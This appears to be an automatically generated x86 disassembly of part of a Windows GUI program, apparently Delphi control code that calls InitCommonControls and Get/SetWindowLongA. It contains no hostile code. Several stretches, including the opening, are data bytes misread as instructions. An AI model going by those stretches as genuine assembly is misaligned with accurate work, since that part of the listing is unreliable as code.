add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
mov bh 0x45
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ eax + 0x64 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] ah
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
pop eax
xor eax 0x355c0040
inc eax
je r-xdata
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
inc ecx
add [ eax ] cl
mov al [ 0xffffffff9f000041 ]
insd
jae r-xdata
inc ecx
add al dl
jmp r-xdata
fcom [ ebx - 0x5ff7ffbf ]
inc ecx
add [ eax ] al
lahf
inc ebx
add ah dh
adc al [ ebx ]
add eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc ebx
add al al
in al dx
inc ebx
add [ eax ] ch
lodsb [ esi ]
inc ecx
add [ eax - 0x2bffbe54 ] dh
in al dx
inc ebx
add [ eax - 0x52 ] ah
inc ecx
add [ eax ] dh
jmp 0xffffffffe9976595
insb
jae r-xdata
add [ 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x65
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43656a
inc ebx
add [ eax - 0x14 ] dh
inc ebx
add [ eax - 0x58 ] bh
inc ecx
add [ eax - 0x14 ] bh
inc ebx
add [ eax + ebp * 4 - 0x5723ffbf ] ch
inc ecx
add [ eax ] dh
test eax 0xec8c0041
inc ebx
add [ ebx + ebp * 4 + 0x41 ] dh
add ah cl
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] ah
inc ecx
add [ ebp * 8 - 0x12e3ffbd ] dl
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
cmp al 0x67
js r-xdata
add [ edx + 0x67 ] bh
inc ebx
add [ eax + 0x54000002 ] ah
pop es
inc esp
dec esi
inc ebx
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + ebx * 8 + 0x5bcc0043 ] bl
inc ebp
add ah dh
and eax [ ebp ]
hlt
sub al 0x45
imul ebp [ esi + 0x67 ] 0x65b49073
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
add al [ eax ]
add [ edi + eax + 0x44 ] dl
js r-xdata
inc ebp
sbb eax [ edx ]
pushad
xor eax 0x2c2c0040
je r-xdata
inc ecx
add ah bl
push eax
inc esp
add ah ah
loope r-xdata
imul ebp [ esi + 0x67 ] 0x43651473
add [ eax ] ah
pop es
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
add [ eax - 0x63ffbaf0 ] ch
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esi + ebx * 8 + 0x43 ] dh
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
insb
jae r-xdata
inc ebx
add [ eax + 0x4367 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x67 ] cl
inc ebx
add [ ebp + 0x662c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
sub_4368cc
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42a820
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_4368f8
push ebx
mov ebx eax
mov eax ebx
call sub_4368cc
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_436958
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_4553b8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_4550b4
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_4550b4
push eax
call SetWindowLongA
sub_4369c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_419a38
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_41964c
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x3
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_436fa4
call sub_4553b8
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4196d8
push eax
mov eax edi
call sub_436fa4
call sub_4550b4
lea ecx [ ebp - 0x21 ]
pop edx
call sub_42aab4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_436a70
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_436fa4
call sub_4553b8
test al al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419684
mov eax esi
call sub_436fe0
test bl bl
jle r-xdata
mov eax ebp
call sub_4196d8
push eax
mov eax [ ebp + 0x4 ]
call sub_436fa4
call sub_4550b4
pop edx
call sub_42aac4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
sub_436ad0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4193e0
push ebx
push r-xdata
push ebx
push sub_436b40
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_436b16
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41d878
mov eax ebx
call sub_41d7c8
mov edx eax
mov eax esi
call sub_436dec
mov eax ebx
call sub_41d880
pop esi
pop ebx
retn
sub_436b40
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41faac
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_41f9e0
mov eax ebx
call sub_41fab4
pop esi
pop ebx
retn
sub_436b64
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_436fa4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4553b8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x289 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b578
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x8 ]
mov [ edx + 0x248 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_41f220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
call sub_41b514
retn
sub_436c60
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419a38
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_4196b4
push ebp
call sub_436b64
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419a40
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_436cbc
shr [ ebx + eax * 2 ] 0x11
add ebp [ esi ]
cmp [ esi ] dh
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
call [ eax - 0x75 ]
inc esi
add al 0xe8
dec esp
add al [ eax ]
add al ch
push edi
jecxz r-xdata
insb
jae r-xdata
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42accc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436d89
lea eax [ ebp - 0x4 ]
mov edx [ sub_436cbc ]
call sub_405400
retn
add [ ebx - 0x17a503b3 ] cl
aas
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_436d82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_419800
mov eax [ esi + 0x4 ]
call sub_419a38
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_436cbc ]
call sub_4053f4
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_419a38
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419a38
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_4196b4
push ebp
call sub_436b64
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ esi + 0x4 ]
call sub_419a38
push eax
mov eax [ esi + 0x4 ]
call sub_436fa4
call sub_4550b4
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_419a40
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419a40
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_436d90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_404524
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_40416c
mov eax ebx
call sub_436c60
sub_436db8
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop ebx
retn
mov eax ebx
call sub_4196d8
push eax
mov eax [ ebx + 0x4 ]
call sub_436fa4
call sub_4550b4
pop edx
call sub_42aadc
mov [ ebx + 0x24 ] eax
sub_436dec
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_436c60
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_436e18
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4196d8
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_4196b4
mov eax [ esi + 0x4 ]
call sub_436fa4
mov edx [ eax ]
call [ edx + 0x80 ]
sub_436e50
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_436fa4
test eax eax
je r-xdata
mov eax ebx
call sub_436c60
mov eax [ ebx + 0x4 ]
call sub_436fa4
mov si 0xffee
call sub_403518
sub_436eb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4192f4
pop esi
pop ebx
retn
mov dl [ esi + 0xc ]
mov eax ebx
call sub_436e18
mov dl [ esi + 0xd ]
mov eax ebx
call sub_436e50
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_436d90
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_436e84
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_436e94
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_436ea4
mov eax esi
call sub_436db8
mov edx eax
mov eax ebx
call sub_436dec
pop esi
pop ebx
retn
sub_436f28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_40416c
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4196f0
sub_436f4c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_419830
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_436fac
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_436fa4
call sub_43b5f8
pop esi
pop ebx
retn
mov eax esi
call sub_4196d8
push eax
mov eax ebx
call sub_436fa4
pop edx
call sub_43b638
pop esi
pop ebx
retn
sub_436fe0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_436fa4
call sub_4553b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4370bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a38
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_436fa4
call sub_4550b4
mov edx ebx
call sub_42aac4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_436fa4
call sub_43b5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436f90
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_436fa4
call sub_4550b4
mov ecx edi
mov edx ebx
call sub_42aab4
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436f90
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_4370cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41964c
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
call sub_404118
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_437124
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_40416c
mov dl 0x1
mov eax ebx
call sub_4196b4
pop esi
pop ebx
retn
sub_437154
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx + 0x2850e8c7 ]
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_404118
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_43721e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_403518
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_419a38
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax edi
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_43722c
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
mov eax edi
call sub_419a38
push eax
mov eax [ ebp - 0x8 ]
call sub_4550b4
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42ad04
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437225
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405400
retn
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_437354
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x30 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ edi + 0x34 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4373a0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aea0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4373d0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41aefc
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418b9c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_437504
mov eax esi
pop esi
pop ebx
retn
sub_4373f8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41af08
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418b9c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_437504
mov eax esi
pop esi
pop ebx
retn
sub_437434
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41afe4
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_418be8
mov eax [ ebx + 0x30 ]
call sub_4376e8
pop esi
pop ebx
retn
sub_437464
push ebx
push esi
mov esi edx
mov eax [ eax + 0x30 ]
call sub_437618
mov ebx eax
mov eax ebx
call sub_439984
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419a38
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_43b38c
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_43b638
sub_4374a8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_41b21c
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x34 ]
call sub_418d74
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_437504
inc edi
dec ebx
jne r-xdata
sub_4374e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b2f8
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_437504
pop esi
pop ebx
retn
sub_437504
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x30 ]
call sub_437b38
push eax
mov eax ebx
call sub_437458
mov ecx esi
pop edx
call sub_42ac38
mov edx esi
mov eax ebx
call sub_437464
pop esi
pop ebx
retn
sub_43755c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437354
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4375ac
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov [ esi + 0x28 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp esi [ eax + 0x270 ]
jne r-xdata
mov eax esi
call sub_437618
call sub_4553b8
test al al
je r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
mov eax [ esi + 0x8 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437644
pop edx
call sub_42a9a4
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_437658
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov al [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax esi
call sub_437b38
push eax
mov eax ebx
call sub_4550b4
pop edx
call sub_42abec
test eax eax
setne al
pop esi
pop ebx
retn
sub_43769c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_437658
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x244 ] 0x0
jne r-xdata
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax edi
call sub_437b38
push eax
mov eax esi
call sub_4550b4
mov ecx ebx
pop edx
call sub_42ac0c
sub_437704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_404524
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_40416c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_437618
call sub_439984
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_437b38
push eax
mov eax ebx
call sub_437644
xor ecx ecx
pop edx
call sub_42ac38
mov eax ebx
call sub_437618
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_437618
mov eax [ eax + 0x23c ]
call sub_419a38
test eax eax
jle r-xdata
mov eax ebx
call sub_437618
call sub_43b130
mov eax ebx
call sub_437618
xor edx edx
call sub_43b38c
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_437618
call sub_43b5f8
sub_4377b4
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_437618
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_437618
call sub_43b130
sub al 0x2
jne r-xdata
sub_4377e4
push ebx
push esi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_4377f4 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437644
mov ecx ebx
pop edx
call sub_42abdc
test eax ebx
setne al
pop esi
pop ebx
retn
sub_43784c
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_43785d ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_437b38
push eax
mov eax ebx
call sub_437644
mov ecx edi
pop edx
call sub_42abac
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_4378bc
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_437b38
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_437644
mov edx esp
call sub_42a974
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437618
pop edx
pop ecx
call sub_439284
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_42a898
push eax
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437644
pop edx
pop ecx
call sub_42abac
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_42a958
push eax
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437644
pop edx
pop ecx
call sub_42abac
xor edi edi
sub_4379f8
push ebx
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_437b38
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_437644
mov edx esp
call sub_42a974
mov eax ebx
call sub_437b38
push eax
mov eax ebx
call sub_437b38
push eax
mov eax ebx
call sub_437618
pop edx
pop ecx
call sub_439284
